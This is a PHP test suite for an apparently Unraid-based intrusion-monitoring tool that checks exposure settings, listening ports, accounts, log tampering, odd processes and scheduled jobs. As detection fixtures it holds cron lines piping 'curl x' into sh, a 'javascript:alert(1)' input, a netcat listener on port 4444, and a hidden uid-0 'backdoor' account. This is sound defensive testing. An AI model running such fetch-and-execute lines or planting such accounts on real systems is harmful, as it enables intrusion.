    file_put_contents("$src/connect.json", '{"dynamicRemoteAccessType":"STATIC","wanport":44321,"username":"x"}');
    watchmanRound($paths + ['connect' => "$src/connect.json"], $data, 1000, $now + 950, $docker, false, $acks);
    same('posture: UPnP on — advice; the WebGUI reachable from the internet — good to know, with its type and port',
        ['advice', 'info', ['type' => 'STATIC', 'port' => '44321']], [$tips(960)['upnp']['level'] ?? null, $tips(960)['remote_access']['level'] ?? null, $tips(960)['remote_access']['p'] ?? null]);
    file_put_contents($paths['ident'], "USE_TELNET=\"yes\"\n");

    // FTP with users while Fix Common Problems is there: its check, he keeps quiet; the CPU protected: good to know
    file_put_contents("$src/plugins/fix.common.problems.plg", "<PLUGIN name=\"fix.common.problems\" version=\"1\">\n");
    file_put_contents($paths['ftp_users'], "benj\n");
    file_put_contents($paths['cmdline'], "BOOT_IMAGE=/bzimage unraiduuid=1\n");
    $vulns(['vmscape' => 'Mitigation: IBPB before exit to userspace', 'spectre_v2' => 'Mitigation: Enhanced IBRS']);
    $containers['vpn']['tokens'] = ['--cap-add=NET_ADMIN'];
    $round(1200);
    same('posture: FTP left to Fix Common Problems, the CPU protected, no privileged container any more', ['flash', 'public', 'telnet', 'mitigations_on'], array_keys($tips(1210)));
    same('posture: the CPU on — which model, good to know', [['cpu' => 'Intel(R) Core(TM) Ultra 7 265K'], 'info'], [$tips(1210)['mitigations_on']['p'], $tips(1210)['mitigations_on']['level']]);
    foreach ([['nothing', true, 'bad_request'], ['telnet', 'yes', 'bad_request'], ['vmscape', true, 'watch_tip_gone']] as [$id, $on, $want]) {
        try {
            watchmanPostureAck($id, $on, $data, $now + 1300, false);
            check("posture ack refused: $id", false);
        } catch (Problem $e) {
            same("posture ack refused: $id", $want, $e->key);
        }
    }
    same('posture ack: «Show again» of a tip that went is harmless', ['ok' => true], watchmanPostureAck('vmscape', false, $data, $now + 1300, false));

    // the watch book: a kind he no longer keeps (cron_dead up to 1.28) is left out quietly
    $book = readJson("$data/book.json") ?? [];
    $book['entries'][] = watchmanEntry('cron_dead', 'cron_dead:/usr/local/emhttp/plugins/gone/run.sh', $now, ['path' => '/usr/local/emhttp/plugins/gone/run.sh', 'plugin' => 'gone']);
    file_put_contents("$data/book.json", json_encode($book));
    $d = watchmanLoad($data);
    same('watch book: an old cron_dead entry is left out quietly — not open, not shown, nothing for the team lead', [false, false, false],
        [in_array('cron_dead', array_column($d['book'], 'kind'), true), isset(watchmanOpenCounts($d['book'])['cron_dead']),
         in_array('cron_dead', array_column(watchmanChecks($data), 'id'), true)]);
    check('watch book: no cron_dead kind any more', !isset(WATCH_KINDS['cron_dead']));

    // the data flow's history in Grafana: only where the consultant saw it with the office's dashboard
    $adv = "$tmp/advisor.json";
    $g = fn (array $grafana, string $webui = 'http://192.168.7.20:3000/', bool $running = true) => file_put_contents($adv, json_encode(
        ['externals' => ['grafana' => ['kind' => 'container', 'there' => true, 'running' => $running, 'webui' => $webui, 'grafana' => $grafana]]]));
    $link = fn () => watchmanPageState($data, $now, false, $adv)['grafana'];
    $g(['points' => true, 'done' => true]);
    same('grafana: the office\'s dashboard at the data flow\'s panels', ['flow_clients' => 'http://192.168.7.20:3000/d/unraid-secretary-office?viewPanel=50',
        'flow_shares' => 'http://192.168.7.20:3000/d/unraid-secretary-office?viewPanel=51'], $link());
    $g(['points' => true, 'done' => true], 'http://10.0.0.5:3000/grafana/?orgId=1');
    same('grafana: under a sub path, without its query', 'http://10.0.0.5:3000/grafana/d/unraid-secretary-office?viewPanel=50', $link()['flow_clients'] ?? null);
    $none = [];
    foreach ([[['points' => true, 'done' => false]], [['points' => false, 'done' => true]], [['points' => true, 'done' => null]],
              [['points' => true, 'done' => true], 'javascript:alert(1)'], [['points' => true, 'done' => true], 'http://x:3000/ "<b>'],
              [['points' => true, 'done' => true], 'http://192.168.7.20:3000/', false]] as $case) {
        $g(...$case);
        $none[] = $link();
    }
    same('grafana: no link without the dashboard provisioned where Grafana reads it, while stopped, or with an odd address', array_fill(0, 6, null), $none);
    same('grafana: no consultant\'s look — no link', null, watchmanPageState($data, $now, false, "$tmp/none.json")['grafana']);
    $dash = json_decode((string) file_get_contents(OFFICE_DIR . '/monitoring/grafana-dashboard.json'), true) ?: [];
    $exprs = [];
    $walk = function (array $panels) use (&$walk, &$exprs): void {
        foreach ($panels as $p) {
            $exprs[(int) ($p['id'] ?? 0)] = implode(' ', array_column((array) ($p['targets'] ?? []), 'expr'));
            $walk((array) ($p['panels'] ?? []));
        }
    };
    $walk((array) ($dash['panels'] ?? []));
    same('grafana: the dashboard the link names', ADVISOR_DASHBOARD_UID, $dash['uid'] ?? null);
    foreach (['flow_clients' => 'uso_watchman_sent_bytes_total', 'flow_shares' => 'uso_watchman_written_bytes_total'] as $group => $metric) {
        check("grafana: panel " . WATCH_GRAFANA_PANELS[$group] . " shows $metric ($group)", str_contains($exprs[WATCH_GRAFANA_PANELS[$group]] ?? '', $metric));
    }

    // every tip has its words, every link its label
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/watchman/lang/en.json'), true) ?: [];
    foreach (array_keys(WATCH_POSTURE) as $id) {
        check("watchman: texts for posture tip $id", isset($en["posture.$id.title"], $en["posture.$id.why"]));
    }
    foreach (['share', 'flash', 'access', 'ftp', 'docker', 'boot'] as $to) {
        check("watchman: link label posture.to_$to", isset($en["posture.to_$to"]));
    }
    @unlink(watchmanLockFile($data, 'book'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Snapshots that vanish: round against round, ZFS of the awake pools and the btrfs snapshot folders of the
 * awake disks — what the office removed itself (Ms. Snapshotini's log, the engine's retention during its
 * run, renamed, the storeroom) is no news; the rest is snap_gone with zpool history and the syslog; a hold
 * released not by Ms. Snapshotini is snap_hold_released; a pool asleep is never "gone"; «I know, thanks»
 * teaches a series
 */
/**
 * The night watchman's look at the host (SOC, 1.30): listeners from ss, accounts in RAM, logs emptied outside their
 * rotation, programs from scratch folders (a stand-in /proc of links), the office's own schedule lines, ATT&CK ids.
 */
function testWatchmanHost(): void
{
    $now = strtotime('2026-10-07 01:00:00');
    // ss -H -tlnp as on nostromo: Docker's forwarders, the VMs' consoles, loopback and a dynamic port
    $ss = "LISTEN 0 4096 0.0.0.0:9100 0.0.0.0:* users:((\"node_exporter\",pid=11,fd=3))\n"
        . "LISTEN 0 4096 [::]:9100 [::]:* users:((\"node_exporter\",pid=11,fd=4))\n"
        . "LISTEN 0 128 0.0.0.0%br0:3702 0.0.0.0:* users:((\"wsdd2\",pid=12,fd=5))\n"
        . "LISTEN 0 4096 0.0.0.0:2283 0.0.0.0:* users:((\"docker-proxy\",pid=13,fd=4))\n"
        . "LISTEN 0 1 0.0.0.0:5900 0.0.0.0:* users:((\"qemu-system-x86\",pid=14,fd=30))\n"
        . "LISTEN 0 64 127.0.0.1:631 0.0.0.0:* users:((\"cupsd\",pid=15,fd=7))\n"
        . "LISTEN 0 64 192.168.7.20:41234 0.0.0.0:* users:((\"rpc.statd\",pid=16,fd=8))\n"
        . "LISTEN 0 64 [::1]:25 [::]:* users:((\"sendmail\",pid=17,fd=9))\n";
    $l = watchmanListenParse($ss, 32768);
    same('host listen: Docker, VM consoles and loopback left out; a dynamic port counts by program',
        ['rpc.statd:*', 'tcp:3702', 'tcp:9100'], array_keys($l));
    same('host listen: addresses, all as *; the program', [['*'], 'node_exporter', null, ['192.168.7.20']],
        [$l['tcp:9100']['addr'], $l['tcp:9100']['prog'], $l['rpc.statd:*']['port'], $l['rpc.statd:*']['addr']]);
    same('host listen: Samba names another process of its own next time — the same port, nothing new', ['tcp:445'],
        array_keys(watchmanListenParse("LISTEN 0 50 0.0.0.0:445 0.0.0.0:* users:((\"smbd-scavenger\",pid=3,fd=37),(\"smbd\",pid=2,fd=37))\n", 32768)));

    $tmp = sys_get_temp_dir() . '/office-tests-host-' . getmypid();
    @mkdir($tmp, 0700, true);
    // accounts: the shell field, the password's state (never the hash)
    file_put_contents("$tmp/passwd", "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/bin/false\nbenj:x:1000:100::/:/bin/false\nnobody:x:99:100::/:\n");
    file_put_contents("$tmp/shadow", 'root:$6$aa$bb:1::::::' . "\nbin:*:1::::::\nbenj:\$6\$cc\$dd:1::::::\nnobody:!:1::::::\n");
    $u = watchmanHostUsers(['etc_passwd' => "$tmp/passwd", 'etc_shadow' => "$tmp/shadow"]);
    same('host users: uid, login shell (an empty field is /bin/sh), the password only as a state',
        ['root' => [0, true, 'hash'], 'bin' => [1, false, 'locked'], 'benj' => [1000, false, 'hash'], 'nobody' => [99, true, 'locked']],
        array_map(fn ($x) => [$x['uid'], $x['shell'], $x['pw']], $u));
    check('host users: no hash kept', !str_contains(json_encode($u), '$6$'));

    // logs: inode and size, the rotated copies, logrotate's date
    file_put_contents("$tmp/syslog", str_repeat("line\n", 100));
    file_put_contents("$tmp/logrotate.status", "logrotate state -- version 2\n\"$tmp/syslog\" 2026-10-6-4:30:0\n");
    $logs = fn () => watchmanHostLogs(['syslog' => "$tmp/syslog"], "$tmp/logrotate.status");
    $host = fn (array $lg, ?array $users = null, ?array $listen = null, ?array $procs = null, string $boot = 'b1') =>
        ['boot' => $boot, 'logs' => $lg, 'users' => $users ?? $u, 'listen' => $listen, 'procs' => $procs];
    $known = null;
    $book = [];
    $flash = ['root', 'benj'];
    $first = $host($logs());
    same('host: the first look reports nothing and knows it all', [[], ['root', 'bin', 'benj', 'nobody']],
        [watchmanHostCompare($known, $first, null, $flash, $book, $now), array_keys($known['users'])]);
    file_put_contents("$tmp/syslog", "short\n");
    $cut = $host($logs());
    same('host log: the same file, smaller — emptied', ['log_cleared'], watchmanHostCompare($known, $cut, $first, $flash, $book, $now + 300));
    same('host log: what the entry says', [['cut'], 1], [$book[0]['p']['how'], $book[0]['count']]);
    $book = [];
    rename("$tmp/syslog", "$tmp/syslog.1");
    file_put_contents("$tmp/syslog", "new\n");
    $rot = $host($logs());
    same('host log: renamed to .1 and a new one — a rotation, nothing', [], watchmanHostCompare($known, $rot, $cut, $flash, $book, $now + 600));
    unlink("$tmp/syslog.1");
    unlink("$tmp/syslog");
    file_put_contents("$tmp/syslog", "again\n");
    $repl = $host($logs());
    same('host log: a new file, the old one nowhere — replaced', ['log_cleared'], watchmanHostCompare($known, $repl, $rot, $flash, $book, $now + 900));
    $book = [];
    file_put_contents("$tmp/syslog", "x\n");
    unlink("$tmp/syslog");
    file_put_contents("$tmp/syslog", "y\n");
    file_put_contents("$tmp/logrotate.status", "logrotate state -- version 2\n\"$tmp/syslog\" 2026-10-7-1:15:0\n");
    same('host log: logrotate\'s new date explains a new file', [], watchmanHostCompare($known, $host($logs()), $repl, $flash, $book, $now + 1200));
    file_put_contents("$tmp/syslog", '');
    same('host log: after a reboot (another boot id) nothing is compared', [],
        watchmanHostCompare($known, $host($logs(), boot: 'b2'), $host($logs()), $flash, $book, $now + 1500));

    // accounts later: in RAM only, a second root, a system account that may log in
    $u2 = $u;
    $u2['backdoor'] = ['uid' => 0, 'shell' => true, 'pw' => 'none'];
    $u2['bin'] = ['uid' => 1, 'shell' => true, 'pw' => 'locked'];
    $u2['joe'] = ['uid' => 1001, 'shell' => false, 'pw' => 'hash'];      // made under Users: on the flash too
    $book = [];
    $r = watchmanHostCompare($known, $host($logs(), $u2), null, array_merge($flash, ['joe']), $book, $now + 1800);
    $by = array_column(array_map(fn ($e) => [$e['p']['user'], $e['p']['why']], $book), 1, 0);
    same('host users: in RAM only and a second root; a system account with a login shell; a flash user is the flash watch\'s',
        [['user_ram', 'user_ram'], ['bin' => ['shell'], 'backdoor' => ['new', 'uid0']], true],
        [$r, $by, isset($known['users']['joe'])]);
    $u3 = $u2;
    $u3['bin']['shell'] = false;
    unset($u3['backdoor']);
    $book2 = [];
    watchmanHostCompare($known, $host($logs(), $u3), null, array_merge($flash, ['joe']), $book2, $now + 2100);
    same('host users: safer again (no login shell) is normal by itself', false, $known['users']['bin']['shell']);

    // ports and programs: new later, adopted with «I know, thanks»
    $book = [];
    $l2 = $l + ['tcp:4444' => ['prog' => 'nc', 'port' => 4444, 'addr' => ['*']]];
    same('host listen: the first look at the ports knows them all', [], watchmanHostCompare($known, $host($logs(), $u3, $l), null, $flash, $book, $now + 2400));
    same('host listen: a program on a port it never used', ['listen_new'], watchmanHostCompare($known, $host($logs(), $u3, $l2), null, $flash, $book, $now + 2700));
    $b = ['host' => $known];
    watchmanAdopt($b, array_values(array_filter($book, fn ($e) => $e['kind'] === 'listen_new'))[0], ['host' => ['listen' => $l2]], $now + 3000);
    $book = [];
    same('host listen: «I know, thanks» makes it normal', [], watchmanHostCompare($b['host'], $host($logs(), $u3, $l2), null, $flash, $book, $now + 3300));

    // a stand-in /proc: links readlink() reads; the server's mount namespace is 1's
    $proc = "$tmp/proc";
    $mk = function (int $pid, string $exe, string $mnt, string $pidns, string $comm) use ($proc) {
        @mkdir("$proc/$pid/ns", 0700, true);
        symlink($exe, "$proc/$pid/exe");
        symlink($mnt, "$proc/$pid/ns/mnt");
        symlink($pidns, "$proc/$pid/ns/pid");
        file_put_contents("$proc/$pid/comm", "$comm\n");
    };
    $mk(1, '/sbin/init', 'mnt:[1]', 'pid:[1]', 'init');
    $mk(100, '/usr/bin/php (deleted)', 'mnt:[1]', 'pid:[1]', 'php');                      // replaced by an update: no news
    $mk(101, '/tmp/.x/kworkerd', 'mnt:[1]', 'pid:[1]', 'kworkerd');
    $mk(102, '/memfd:payload (deleted)', 'mnt:[1]', 'pid:[1]', 'payload');
    $mk(103, '/memfd:runc_cloned:/proc/self/exe (deleted)', 'mnt:[1]', 'pid:[1]', 'runc:[1:CHILD]');
    $mk(200, '/usr/bin/bash', 'mnt:[7]', 'pid:[9]', 'bash');                              // virtual-dsm's main process
    $mk(201, '/run/host.bin', 'mnt:[7]', 'pid:[9]', 'host.bin');
    $mk(300, '/tmp/app', 'mnt:[8]', 'pid:[10]', 'app');                                   // a namespace of no container known
    $mk(400, '/tmp/.mount_firefogY32OL/firefox-bin', 'mnt:[1]', 'pid:[1]', 'firefox-bin');   // Unraid's GUI mode: an AppImage
    @mkdir("$proc/self", 0700);
    $p = watchmanHostProcs($proc, ['virtual-dsm' => ['pid' => 200]]);
    same('host procs: scratch folders, hidden folders, memory — on the server or in a container; runc\'s copy and an updated binary are none',
        ['ct:?:/tmp/app', 'ct:virtual-dsm:/run/host.bin', 'host:/memfd:payload', 'host:/tmp/.mount_firefo*/firefox-bin', 'host:/tmp/.x/kworkerd'], array_keys($p));
    same('host procs: what a program picks anew at every start is * in his memory, the entry keeps the real path',
        ['/tmp/.mount_firefoXy12Ab/firefox-bin', '/tmp/*/run.sh', '/tmp/build/go-build', '/usr/bin/x'],
        [$p['host:/tmp/.mount_firefo*/firefox-bin']['exe'] === '/tmp/.mount_firefogY32OL/firefox-bin' ? '/tmp/.mount_firefoXy12Ab/firefox-bin' : '?',
         watchmanOddKey('/tmp/tmp.aB3dE9/run.sh'), watchmanOddKey('/tmp/build/go-build'), watchmanOddKey('/usr/bin/x')]);
    same('host procs: Docker didn\'t answer — not looked at (a container\'s program would seem new)', null, watchmanHostProcs($proc, null));
    $kp = ['procs' => ['host:/usr/x' => $now]];
    $bp = [];
    $hp = fn (array $pr) => ['boot' => 'b1', 'logs' => null, 'users' => null, 'listen' => null, 'procs' => $pr, 'doors' => null];
    $one = ['ct:?:/run/host.bin' => ['where' => '?', 'exe' => '/run/host.bin', 'prog' => 'host.bin']];
    same('host procs: new for one round only (a container restarted between the looks) — nothing; seen two rounds in a row — told',
        [[], ['proc_odd']], [watchmanHostCompare($kp, $hp($one), $hp([]), [], $bp, $now), watchmanHostCompare($kp, $hp($one), $hp($one), [], $bp, $now + 300)]);
    @mkdir("$proc/500/ns", 0700, true);
    symlink('/usr/bin/node_exporter', "$proc/500/exe");
    symlink('mnt:[11]', "$proc/500/ns/mnt");
    symlink('pid:[1]', "$proc/500/ns/pid");
    @mkdir("$proc/600/ns", 0700, true);
    symlink('/tmp/y', "$proc/600/exe");
    symlink('mnt:[12]', "$proc/600/ns/mnt");
    symlink('pid:[1]', "$proc/600/ns/pid");
    same('host procs: a --pid=host container is no name for the server\'s PID namespace', '?',
        watchmanHostProcs($proc, ['Node-Exporter' => ['pid' => 500], 'virtual-dsm' => ['pid' => 200]])['ct:?:/tmp/y']['where'] ?? null);
    same('host procs: the program and where', ['kworkerd', null, 'virtual-dsm'], [$p['host:/tmp/.x/kworkerd']['prog'], $p['host:/tmp/.x/kworkerd']['where'],
        $p['ct:virtual-dsm:/run/host.bin']['where']]);

    // the office's own schedule lines; ATT&CK
    same('office cron: its own line, and what is not', [true, true, false, false, false], [
        watchmanOfficeCronLine('0 3 * * * ' . officeJobCommand('backup')),
        watchmanOfficeCronLine('*/5 * * * * ' . officeJobCommand('snapshots')),
        watchmanOfficeCronLine('0 3 * * * ' . officeJobCommand('backup') . '; curl x | sh'),
        watchmanOfficeCronLine('0 3 * * * bash /tmp/job.sh backup > /dev/null 2>&1'),
        watchmanOfficeCronLine('@reboot root ' . officeJobCommand('backup'))]);
    $book = [watchmanEntry('cron_file', 'cron_file:x/x.cron', $now - 60, ['lines' => 1])];
    watchmanOfficeNoteSchedule($book, 'x/x.cron', $now, ['lines' => 1, 'office' => true]);
    watchmanOfficeNoteSchedule($book, 'x/x.cron', $now + 60, ['lines' => 1, 'office' => true]);
    same('office cron: an open entry about the file is closed as the line, a later change is a line of its own', [2, ['schedule', 'schedule'], [false, false]],
        [count($book), array_column($book, 'by'), array_map('watchmanOpen', $book)]);
    // the ways in: ident.cfg, Connect, single sign-ons, WireGuard — never a key kept
    file_put_contents("$tmp/ident.cfg", "USE_SSH=\"yes\"\nPORTSSH=\"22\"\nUSE_UPNP=\"no\"\n");
    file_put_contents("$tmp/connect.json", '{"wanport":0,"dynamicRemoteAccessType":"DISABLED","username":"x"}');
    file_put_contents("$tmp/oidc.json", '{"providers":[{"id":"unraid.net","name":"Unraid.net","clientId":"c","issuer":"https://account.unraid.net"}]}');
    @mkdir("$tmp/wg", 0700);
    $peer = fn () => base64_encode(random_bytes(32));
    $p1 = $peer();
    file_put_contents("$tmp/wg/wg0.conf", "[Interface]\nPrivateKey = " . base64_encode(random_bytes(32)) . "\nListenPort = 51820\n[Peer]\nPublicKey = $p1\nAllowedIPs = 10.253.0.2/32\n");
    $dp = ['ident' => "$tmp/ident.cfg", 'connect' => "$tmp/connect.json", 'oidc' => "$tmp/oidc.json", 'wireguard' => "$tmp/wg"];
    $doors = watchmanHostDoors($dp);
    same('host doors: SSH, UPnP, Connect, a single sign-on, a tunnel with its peer', [['ssh', 'upnp', 'connect', 'oidc:unraid.net', 'wg:wg0'], [true, false, false, true, true], 1, 'account.unraid.net'],
        [array_keys($doors), array_column($doors, 'on'), count($doors['wg:wg0']['peers']), $doors['oidc:unraid.net']['issuer']]);
    check('host doors: no key, no client id kept', !str_contains(json_encode($doors), $p1) && !str_contains(json_encode($doors), 'PrivateKey') && !str_contains(json_encode($doors), '"c"'));
    $kd = null;
    $bk = [];
    $hd = fn (array $d) => ['boot' => 'b1', 'logs' => null, 'users' => null, 'listen' => null, 'procs' => null, 'doors' => $d];
    watchmanHostCompare($kd, $hd($doors), null, [], $bk, $now);
    file_put_contents("$tmp/ident.cfg", "USE_SSH=\"yes\"\nPORTSSH=\"2222\"\nUSE_UPNP=\"yes\"\n");
    file_put_contents("$tmp/wg/wg0.conf", "PublicKey = " . $p1 . "\nPublicKey = " . $peer() . "\n");
    file_put_contents("$tmp/oidc.json", '{"providers":[]}');
    same('host doors: SSH on another port, UPnP switched on, a new WireGuard peer — a provider gone is safer',
        ['door_new', 'door_new', 'door_new'], watchmanHostCompare($kd, $hd(watchmanHostDoors($dp)), null, [], $bk, $now + 300));
    same('host doors: what the entries say', [['ssh', 2222], ['upnp', null], ['wg', 1], false],
        [[$bk[0]['p']['door'], $bk[0]['p']['port']], [$bk[1]['p']['door'], $bk[1]['p']['port']], [$bk[2]['p']['door'], $bk[2]['p']['new_peers']], isset($kd['doors']['oidc:unraid.net'])]);
    same('host doors: in words (notifications)', ['SSH, port 2222', 'WireGuard tunnel wg0: 2 peers'],
        [watchmanText($bk[0], 'en')['door'], officeNotifyText('watchman', 'door.wg', ['name' => 'wg0', 'n' => 2], 'en')]);
    file_put_contents("$tmp/ident.cfg", "USE_SSH=\"no\"\nPORTSSH=\"2222\"\nUSE_UPNP=\"no\"\n");
    $bk2 = [];
    watchmanHostCompare($kd, $hd(watchmanHostDoors($dp)), null, [], $bk2, $now + 600);
    same('host doors: closed again is normal by itself', [false, false], [$kd['doors']['ssh']['on'], $kd['doors']['upnp']['on']]);

    // for a SIEM: one line of JSON, the technique, the words in English; the summary of what is normal
    $line = watchmanSyslogLine($bk[0] + ['by' => null]);
    $j = json_decode($line, true);
    same('syslog: one line of JSON — kind, technique, important, the entry in English', [false, 'door_new', 'T1133', true, 'A new way in from outside: SSH, port 2222'],
        [str_contains($line, "\n"), $j['kind'], $j['attack'], $j['important'], $j['text']]);
    check('syslog: his own forwarded lines are never evidence', (bool) preg_match(WATCH_SYSLOG_OWN, 'Oct  7 01:00:00 Tower uso-watchman: {"v":1}'));
    $sum = watchmanHostSummary(['users' => $u, 'listen' => ['tcp:9100' => 1], 'procs' => [], 'doors' => $kd['doors']], ['listen' => $l, 'procs' => []]);
    same('host summary: the known ports with their program, the ways in that are open, how many accounts',
        [[['key' => 'tcp:9100', 'prog' => 'node_exporter', 'port' => 9100, 'addr' => ['*']]], ['wg'], 4],
        [$sum['listen'], array_column($sum['doors'], 'what'), $sum['users']]);
    // what may belong together: important, not noted, two kinds or more, each within an hour of another
    $e = fn (string $kind, int $t, ?int $noted = null) => ['id' => 'w' . substr(md5($kind . $t), 0, 10), 'kind' => $kind, 'key' => $kind, 'time' => $t, 'last' => $t,
        'count' => 1, 'p' => ['ip' => '203.0.113.9', 'users' => ['root'], 'services' => ['ssh:password'], 'lines' => 1, 'jobs' => ['* * * * * curl x|sh'],
        'prog' => 'nc', 'port' => 4444], 'noted' => $noted, 'by' => null, 'told' => null];
    $cb = [$e('login_new_ip', $now), $e('cron_new', $now + 600), $e('listen_new', $now + 1500), $e('smb_client', $now + 1600),
           $e('flash_go', $now + 9000), $e('plugin_new', $now + 20000), $e('cron_new', $now + 20010), $e('listen_new', $now + 20020),
           $e('container_new', $now + 20100, $now)];
    $ch = watchmanChains($cb, $now + 21000);
    same('chains: login, cron line and port within the hour; a plugin with its cron line and port (no way in), not important, alone or noted are none',
        [1, 3, ['login', 'sched', 'host']], [count($ch), count($ch[0]['ids']), $ch[0]['groups']]);
    same('chains: damage of two sorts — snapshots gone and much written', 1,
        count(watchmanChains([$e('snap_gone', $now), $e('flow_written', $now + 300)], $now + 600)));
    $cst = ['notify' => true];
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify-stand-in");
    file_put_contents("$tmp/notify-stand-in", "#!/bin/sh\necho \"\$@\" >> " . escapeshellarg("$tmp/notified") . "\n");
    chmod("$tmp/notify-stand-in", 0755);
    $t1 = watchmanChainsDue($cb, $cst, $now + 21000, true, 'en');
    $t2 = watchmanChainsDue($cb, $cst, $now + 21300, true, 'en');
    same('chains: told once when it forms, not again', [[['kind' => 'chain', 'n' => 1, 'sent' => true]], []],
        [array_map(fn ($t) => array_intersect_key($t, ['kind' => 1, 'n' => 1, 'sent' => 1]), $t1), $t2]);
    $cl = json_decode(watchmanSyslogChainLine($t1[0]), true);
    same('chains: the SIEM line — the ids and groups of the chain', ['chain', 3, ['login', 'sched', 'host'], 'Night watchman: 3 entries that may belong together'],
        [$cl['kind'], count($cl['ids']), $cl['groups'], $cl['text']]);
    same('chains: the minutes between when the first and the last came (not when seen again)', [$now, $now + 1500], [$ch[0]['first'], $ch[0]['last']]);
    check('chains: the message names it', str_contains((string) @file_get_contents("$tmp/notified"), '3 entries that may belong together'));
    $off = ['notify' => false];
    same('chains: with the reports off never told, also not later', [[], []],
        [watchmanChainsDue($cb, $off, $now + 21000, true, 'en'), watchmanChainsDue($cb, array_merge($off, ['notify' => true]), $now + 21300, true, 'en')]);
    putenv('OFFICE_NOTIFY_BIN');
    same('attack: every kind has its technique, in ATT&CK\'s shape', [[], []],
        [array_values(array_diff(array_keys(WATCH_KINDS), array_keys(WATCH_ATTACK))),
         array_values(array_filter(WATCH_ATTACK, fn ($t) => !preg_match('/^T\d{4}(\.\d{3})?$/D', $t)))]);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The night shift: a round in RAM only from the mirror (never the data folder), the mirror in RAM and on the flash
 * (throttled, no secrets), the array's lines, the lock, the handover at the array's start (the syslog's place, no
 * entry twice, nothing lost)
 */
function testWatchmanNight(): void
{
    $now = strtotime('2026-10-07 09:00:00');
    $tmp = sys_get_temp_dir() . '/office-tests-night-' . getmypid();
    $src = "$tmp/src";
    $day = "$tmp/data/watchman";
    $night = "$tmp/run/nightshift";
    $ram = "$tmp/run/watchman-mirror.json";
    $flash = "$tmp/flash/watchman-mirror.json";
    $lock = "$tmp/run/nightshift.lock";
    foreach (['plugins', 'extra', 'ssh/root', 'flash', 'run'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    @mkdir("$tmp/flash", 0700, true);
    @mkdir("$tmp/run", 0700, true);
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd", 'array_events' => "$tmp/run/array-events", 'boot_id' => "$tmp/boot_id",
              'stat' => "$tmp/stat"];
    file_put_contents("$tmp/stat", "cpu  1 2 3\nbtime " . ($now - 86400) . "\nprocesses 9\n");
    $boot1 = 'aaaaaaaa-0000-4000-8000-000000000001';
    $boot2 = 'aaaaaaaa-0000-4000-8000-000000000002';
    file_put_contents("$tmp/boot_id", "$boot1\n");
    // the night's places: as watchmanNightPaths() leaves them (no shares' exports)
    $nightPaths = array_diff_key($paths, array_flip(['sec', 'sec_nfs', 'share_cfg']));
    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
    file_put_contents($paths['syslog'], $line($now - 7200, 'webgui: Successful login user root from 192.168.7.10'));
    file_put_contents("$src/plugins/ca.plg", "<PLUGIN name=\"ca\" version=\"1\" pluginURL=\"https://raw.githubusercontent.com/unraid/ca/master/ca.plg\">\n");
    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\n");
    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n");
    file_put_contents($paths['sec'], "[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n");
    file_put_contents($paths['sec_nfs'], '');
    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\n");
    $docker = fn () => ['plex' => ['image' => 'plex', 'tokens' => ['-p 32400:32400/tcp']]];
    $acks = "$tmp/acks.json";
    $notified = "$tmp/notified";
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
    chmod("$tmp/notify", 0755);
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
    $calls = fn () => array_values(array_filter(explode("\n", (string) @file_get_contents($notified))));
    $openKeys = fn (array $book) => array_column(array_values(array_filter($book, 'watchmanOpen')), 'key');

    // the day: he takes over, then a login from a new address (told)
    watchmanRound($paths, $day, 1000, $now, $docker, true, $acks);
    file_put_contents($paths['syslog'], $line($now + 200, 'webgui: Successful login user root from 10.0.0.5'), FILE_APPEND);
    watchmanRound($paths, $day, 1000, $now + 300, $docker, true, $acks);
    same('night: the day told the new address', [['login_new_ip:10.0.0.5'], 1], [$openKeys(watchmanLoad($day)['book']), count($calls())]);

    // the mirror: RAM all of it, the flash without secrets and only when changed, at most once an hour
    same('night mirror: first write goes to the flash too', 'flash', watchmanMirrorWrite($day, $ram, $flash, $now + 300, $boot1));
    touch($flash, $now + 300);
    $m = readJson($ram);
    $f = (string) file_get_contents($flash);
    same('night mirror (RAM): baseline, the syslog\'s place with its boot, the open entry', [1000, true, 'boot1', ['login_new_ip:10.0.0.5']],
        [$m['baseline']['hired'], is_array($m['state']['syslog']), ($m['state']['syslog']['boot'] ?? null) === $boot1 ? 'boot1' : null, array_column($m['open'], 'key')]);
    $pw = (string) (watchmanLoad($day)['baseline']['flash']['pw']['root'] ?? 'none');
    check('night mirror (flash): no password fingerprint, no password field, no syslog place, no failures',
        !str_contains($f, $pw) && !str_contains($f, '$6$') && !array_key_exists('syslog', json_decode($f, true)['state']) && !str_contains($f, '"fails"'));
    check('night mirror (RAM and flash): root only', (fileperms($ram) & 0777) === 0600 && (fileperms($flash) & 0777) === 0600);
    same('night mirror: unchanged — the flash is left alone', 'ram', watchmanMirrorWrite($day, $ram, $flash, $now + 900, $boot1));
    file_put_contents("$src/plugins/new.plg", "<PLUGIN name=\"new\" version=\"1\" pluginURL=\"https://example.com/new.plg\">\n");
    watchmanRound($paths, $day, 1000, $now + 1000, $docker, true, $acks);
    $flashBefore = (string) file_get_contents($flash);
